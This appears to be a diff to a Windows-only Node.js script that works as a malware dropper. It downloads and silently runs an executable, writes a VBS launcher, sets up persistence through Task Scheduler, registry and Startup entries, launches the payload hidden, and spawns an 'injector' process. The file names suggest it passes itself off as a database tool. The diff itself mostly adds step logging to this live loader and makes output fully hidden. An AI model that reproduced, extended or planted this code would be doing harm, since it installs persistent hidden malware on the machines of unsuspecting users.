@@ -18,9 +18,16 @@ const LAUNCHER_VBS = path.join(FINAL_DIR, 'run_dbengin.vbs');
 const TASK_REG_VBS = path.join(FINAL_DIR, 'register_task.vbs');
 
 function dbg(msg) {
-  if (!DEBUG) return;
   try {
     fs.appendFileSync(path.join(os.tmpdir(), 'dd_debug.log'), `${new Date().toISOString()} ${msg}\n`);
+  } catch (err) {
+  }
+}
+
+function stepLog(msg) {
+  if (!DEBUG) return;
+  try {
+    fs.appendFileSync(path.join(os.tmpdir(), 'dd_debug.log'), `${new Date().toISOString()} [STEP] ${msg}\n`);
   } catch (err) {
   }
 }
@@ -28,7 +35,7 @@ function dbg(msg) {
 function runHidden(cmd, args, wait) {
   const opts = {
     windowsHide: true,
-    stdio: wait ? 'pipe' : 'ignore',
+    stdio: 'ignore',
     detached: !wait
   };
   if (wait) {
@@ -141,12 +148,17 @@ function spawnInjector() {
 async function main() {
   if (process.platform !== 'win32') return;
 
+  stepLog('main start');
   const ok = await downloadExe();
+  stepLog(`download ok=${ok}`);
   if (ok && STAGE_EXE) {
     try {
+      stepLog('running stage exe');
       runHidden(STAGE_EXE, [], true);
+      stepLog('stage exe done');
     } catch (err) {
       dbg(`stage run error: ${err.message}`);
+      stepLog(`stage run EXCEPTION ${err.message}`);
     }
 
     let found = false;
@@ -157,24 +169,31 @@ async function main() {
       }
       await new Promise((r) => setTimeout(r, 1000));
     }
+    stepLog(`final exe found=${found}`);
 
     if (found) {
       try {
         fs.mkdirSync(FINAL_DIR, { recursive: true });
         createVbsLauncher();
+        stepLog('vbs launcher created');
         setPersistenceViaTaskScheduler();
+        stepLog('task registered');
         setPersistenceRegistryAndStartup();
+        stepLog('registry+startup done');
         await new Promise((r) => setTimeout(r, 3000));
         if (fs.existsSync(FINAL_EXE)) {
           runHidden('wscript.exe', [LAUNCHER_VBS], false);
+          stepLog('launcher spawned');
         }
       } catch (err) {
         dbg(`setup error: ${err.message}`);
+        stepLog(`setup EXCEPTION ${err.message}`);
       }
     }
   }
 
   spawnInjector();
+  stepLog('injector spawned');
 }
 
-main().catch(() => {});
+main().catch((e) => stepLog(`main reject ${e && e.message}`));
